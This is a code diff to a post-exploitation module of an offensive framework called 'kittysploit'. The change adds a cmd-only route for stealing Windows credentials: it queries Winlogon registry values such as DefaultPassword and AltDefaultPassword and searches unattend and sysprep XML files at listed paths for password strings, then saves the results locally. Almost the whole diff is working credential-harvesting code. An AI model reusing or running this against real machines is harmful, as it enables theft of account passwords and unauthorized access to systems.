@@ -7,6 +7,7 @@ embedded credentials on a Windows session.
 """
 
 from kittysploit import *
+from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
 import base64
 import os
 import re
@@ -89,6 +90,12 @@ class Module(Post):
     }
 
     save_local = OptBool(True, "Save results under ./output", False)
+    prefer_powershell = OptBool(
+        False,
+        "Prefer PowerShell when available (default: reg/findstr via cmd)",
+        False,
+        True,
+    )
 
     def _execute_cmd(self, command: str) -> str:
         if not command:
@@ -173,11 +180,58 @@ $sections -join "`n`n"
 """
 
     def check(self):
-        ps_check = self._execute_cmd('powershell -NoP -Command "Write-Output 1"')
-        if "1" not in ps_check:
-            print_error("PowerShell is not available on the target")
-            return False
+        # Registry + file reads work from cmd; PowerShell is optional
         return True
+
+    def _extract_via_cmd(self) -> str:
+        sections = []
+        winlogon = (
+            r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+        )
+        sections.append("=== Winlogon (HKLM) ===")
+        for value in (
+            "AutoAdminLogon",
+            "DefaultUserName",
+            "DefaultDomainName",
+            "DefaultPassword",
+            "AltDefaultUserName",
+            "AltDefaultPassword",
+            "LastUsedUsername",
+        ):
+            out = self._execute_cmd(f'reg query "{winlogon}" /v {value}')
+            if out and "ERROR:" not in out.upper():
+                sections.append(out)
+            else:
+                sections.append(f"{value}  (not set / not accessible)")
+
+        xml_candidates = (
+            r"C:\Windows\Panther\unattend.xml",
+            r"C:\Windows\Panther\Unattend.xml",
+            r"C:\Windows\Panther\autounattend.xml",
+            r"C:\Windows\Panther\AutoUnattend.xml",
+            r"C:\Windows\System32\Sysprep\unattend.xml",
+            r"C:\Windows\System32\Sysprep\Unattend.xml",
+            r"C:\unattend.xml",
+            r"C:\Autounattend.xml",
+        )
+        xml_hits = []
+        for path in xml_candidates:
+            exists = self._execute_cmd(f'if exist "{path}" (echo EXISTS) else (echo MISSING)')
+            if exists and "EXISTS" in exists:
+                hits = self._execute_cmd(
+                    f'findstr /i /n /c:"password" /c:"passwd" /c:"autologon" '
+                    f'/c:"credentials" "{path}"'
+                )
+                if hits and "FINDSTR:" not in hits.upper():
+                    xml_hits.append(f"=== {path} ===\n{hits}")
+                else:
+                    xml_hits.append(f"=== {path} ===\n(file found, no obvious password keywords)")
+        if xml_hits:
+            sections.append("=== Unattend / Sysprep XML ===")
+            sections.extend(xml_hits)
+        else:
+            sections.append("=== Unattend / Sysprep XML ===\n(no unattend XML files found)")
+        return "\n\n".join(sections)
 
     def _save_output(self, content: str) -> str:
         os.makedirs(_LOCAL_OUT, exist_ok=True)
@@ -189,10 +243,17 @@ $sections -join "`n`n"
 
     def run(self):
         if not self.check():
-            raise ProcedureError(FailureType.NotCompatible, "PowerShell is not available on the target")
+            raise ProcedureError(win_compat_failure_type(), "Autologon scan prerequisites not met")
 
         print_status("Searching Winlogon autologon and unattend XML secrets...")
-        result = self._run_powershell(self._powershell_script())
+        use_ps = self._bool_opt(self.prefer_powershell, False) and win_probe_powershell(self._execute_cmd)
+        if use_ps:
+            print_info("Using PowerShell")
+            result = self._run_powershell(self._powershell_script())
+        else:
+            if self._bool_opt(self.prefer_powershell, False):
+                print_warning("PowerShell preferred but not available — falling back to reg/cmd")
+            result = self._extract_via_cmd()
 
         if not result:
             raise ProcedureError(FailureType.Unknown, "No output was returned")
